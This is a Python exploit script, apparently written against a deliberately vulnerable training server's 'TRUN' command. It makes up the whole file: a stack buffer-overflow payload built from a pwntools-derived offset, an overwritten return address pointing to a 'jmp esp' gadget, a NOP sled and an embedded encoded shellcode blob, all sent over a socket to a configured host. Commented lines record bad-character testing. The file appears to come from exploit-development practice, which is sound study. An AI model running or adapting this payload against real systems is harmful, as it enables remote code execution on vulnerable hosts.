import socket
import struct

import pwn

from fuzzer.config import load_config


def main():
    config = load_config()
    
    buf =  b""
    buf += b"\xbe\xf8\x8a\xaf\xeb\xdb\xdb\xd9\x74\x24\xf4\x5a"
    buf += b"\x31\xc9\xb1\x59\x31\x72\x14\x03\x72\x14\x83\xc2"
    buf += b"\x04\x1a\x7f\x53\x03\x55\x80\xac\xd4\x09\xb0\x7e"
    buf += b"\x5d\x2c\xd6\xf5\x0c\x9e\x9c\x58\xbd\x55\xf0\x48"
    buf += b"\xb2\xde\xbf\x56\xfd\xdf\xcb\xe5\xd5\x2e\x0c\xa5"
    buf += b"\x1a\x31\xf0\xb4\x4e\x91\xc9\x76\x83\xd0\x0e\xc1"
    buf += b"\xe9\x3d\xc2\x85\x9a\x93\xf3\xa2\xdf\x2f\xf5\x64"
    buf += b"\x54\x0f\x8d\x01\xab\xfb\x21\x0b\xfc\x88\xe2\x2b"
    buf += b"\x77\xc6\x0a\x7c\x86\x05\xaf\xb5\xfc\x95\xf9\x74"
    buf += b"\x02\x6e\xcd\xfd\xfd\xa6\x1f\xc2\x3f\x89\x6d\x6e"
    buf += b"\xbe\xd2\x56\x8e\xb4\x28\xa5\x33\xcf\xeb\xd7\xef"
    buf += b"\x5a\xeb\x70\x7b\xfc\xcf\x81\xa8\x9b\x84\x8e\x05"
    buf += b"\xef\xc2\x92\x98\x3c\x79\xae\x11\xc3\xad\x26\x61"
    buf += b"\xe0\x69\x62\x31\x89\x28\xce\x94\xb6\x2a\xb6\x49"
    buf += b"\x13\x21\x55\x9f\x23\xca\xa5\xa0\x79\x5c\x69\x6d"
    buf += b"\x82\x9c\xe5\xe6\xf1\xae\xaa\x5c\x9e\x82\x23\x7b"
    buf += b"\x59\x93\x24\x7c\xb5\x1b\x24\x82\x36\x5b\x6c\x41"
    buf += b"\x62\x0b\x06\x60\x0b\xc0\xd6\x8d\xde\x7c\xdd\x19"
    buf += b"\x4d\x9d\x01\xe4\xe5\x9f\xc1\x06\xaa\x16\x27\x78"
    buf += b"\x02\x78\xf8\x39\xf2\x38\xa8\xd1\x18\xb7\x97\xc2"
    buf += b"\x22\x12\xb0\x69\xcd\xca\xe8\x05\x74\x57\x62\xb7"
    buf += b"\x79\x42\x0e\xf7\xf2\x66\xee\xb6\xf2\x03\xfc\xaf"
    buf += b"\x64\xeb\xfc\x2f\x01\xeb\x96\x2b\x83\xbc\x0e\x36"
    buf += b"\xf2\x8a\x90\xc9\xd1\x89\xd7\x36\xa4\xbb\xac\x01"
    buf += b"\x32\x83\xda\x6d\xd2\x03\x1b\x38\xb8\x03\x73\x9c"
    buf += b"\x98\x50\x66\xe3\x34\xc5\x3b\x76\xb7\xbf\xe8\xd1"
    buf += b"\xdf\x3d\xd6\x16\x40\xbe\x3d\x25\x87\x40\xc3\x02"
    buf += b"\x20\x28\x3b\x13\xd0\xa8\x51\x93\x80\xc0\xae\xbc"
    buf += b"\x2f\x20\x4e\x17\x78\x28\xc5\xf6\xca\xc9\xda\xd2"
    buf += b"\x8b\x57\xda\xd1\x17\x68\xa1\x9a\xa8\x89\x56\xb3"
    buf += b"\xcc\x8a\x56\xbb\xf2\xb7\x80\x82\x80\xf6\x10\xb1"
    buf += b"\x9b\x4d\x34\x90\x31\xad\x6a\xe2\x13"
    shellcode = buf
    
    # all_characters = b"".join([struct.pack("<B", character) for character in range(1, 256)]) # ascii characters range(255 vs 256???)
    # there is <0x00> null byte character which means end of string so it terminates everything after that / like stop, so range(1, 256)
    
    total_length = 2984 # 2992 if /././././ ...
    old_eip = 0x386F4337
    new_eip = struct.pack("<I", 0x62501203) # jmp esp, b"BBBB"
    pattern = pwn.cyclic_metasploit(length=total_length)
    offset = pwn.cyclic_metasploit_find(old_eip)
    nop_sled = b"\x90" * 16 # as long as you want
    
    payload_parts = (b"TRUN /.:/", b"A" * offset, new_eip, nop_sled, shellcode, b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode)))
    # payload_parts = (b"TRUN /.:/", b"A" * offset, new_eip, nop_sled, b"C" * (total_length - offset - len(new_eip) - len(nop_sled)))
    # payload_parts = (b"TRUN /.:/", b"A" * offset, new_eip, all_characters, b"C" * (total_length - offset - len(new_eip) - len(all_characters))) # (total_length - offset - len(new_eip), pattern, b"A" * total_length
    payload = b"".join(payload_parts)
    
    with socket.socket() as session:
        session.connect((config.HOST, config.PORT))
        session.send(payload)


if __name__ == "__main__":
    main()
